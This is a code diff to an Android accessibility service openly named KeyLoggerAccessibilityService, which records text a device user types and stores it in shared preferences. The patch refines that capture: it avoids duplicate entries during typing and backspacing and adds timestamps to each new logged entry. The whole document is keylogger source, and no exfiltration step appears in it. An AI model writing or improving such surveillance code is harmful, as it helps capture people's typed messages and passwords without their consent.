@@ -72,9 +72,11 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
         try {
             SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
             String savedLog = preferences.getString("KeyLogger", "");
-            String newLog;
+            String currentSavedLog = (savedLog.length() > 0) ? savedLog.substring(savedLog.lastIndexOf("\n") + 1) : "";
+            String newLog = "";
 
-            if (savedLog.equals(eventLog)) {
+            // Check if the savedLog is identical to eventLog; then no change is required
+            if (currentSavedLog.equals(eventLog)) {
                 return;
             }
             // Check if the savedLog contains part of the eventLog
@@ -82,13 +84,19 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
             // Use-case: for saving text repeatedly when user hits backspace
             // Cond 2: Check if savedLog contains part of eventLog
             // Use-case: to avoid saving repeatedly as user types each character
-            else if (savedLog.length() > eventLog.length() && eventLog.contains(savedLog.substring(savedLog.length() - eventLog.length()))) {
+            else if (currentSavedLog.length() > 0 && eventLog.contains(currentSavedLog)) {
                 // Updated savedLog as follows: savedLog - oldLog + newLog
                 // NOTE: Here the old and new logs are from the same events
-                newLog = savedLog.substring(0, savedLog.length() - eventLog.length()) + eventLog;
+                String oldLog = savedLog.substring(0, savedLog.lastIndexOf("\n") + 1);
+                newLog = oldLog + eventLog;
             }
+            // Else this is a new log to be added
             else {
-                newLog = savedLog + "\r\n" + eventLog;
+                // Create timestamp
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss z");
+                String currentDatetime = sdf.format(new Date());
+
+                newLog = savedLog + "\n[" + currentDatetime + "]\n" + eventLog;
             }
 
             preferences = PreferenceManager.getDefaultSharedPreferences(this);
@@ -97,6 +105,7 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
             editor.apply();
         }
         catch (Exception e) {
+
             e.printStackTrace();
         }
     }
